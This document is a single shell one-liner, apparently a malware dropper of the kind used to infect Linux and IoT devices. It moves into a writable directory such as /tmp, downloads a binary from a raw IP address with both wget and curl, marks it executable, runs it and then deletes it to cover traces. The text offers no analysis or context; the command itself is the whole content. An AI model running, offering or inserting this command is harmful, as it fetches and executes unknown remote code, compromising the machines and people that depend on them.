cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://159.203.76.24/wget; curl -O http://159.203.76.24/wget; chmod +x wget; ./wget; rm -rf wget
